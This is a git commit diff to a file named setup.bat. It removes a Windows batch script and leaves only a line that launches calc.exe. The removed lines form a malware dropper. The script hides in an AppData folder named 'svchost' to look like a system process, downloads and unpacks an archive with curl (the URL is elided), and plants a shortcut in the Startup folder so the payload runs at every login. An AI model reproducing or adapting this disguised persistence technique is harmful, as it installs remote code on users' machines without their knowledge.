4a49512d114e7ba8d30864b86e74588f44f6771b
DanLianso <louchik123@gmail.com>
2025-03-13 15:38:47 +0500

    Update setup.bat

--- setup.bat
+++ setup.bat
@@ -1,19 +1,3 @@
 @echo off
 
-del C:/del_later
-
-cd %USERPROFILE%/Appdata/Local/Microsoft/
-
-mkdir svchost
-
-cd svchost
-
-curl -OL https:// ...
-
-tar -xf setup.zip
-
-set path_to_lnk=%cd%/svchost.lnk
-
-cd %USERPROFILE%/Appdata/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/
-
-copy %path_to_lnk% .lnk
+calc.exe
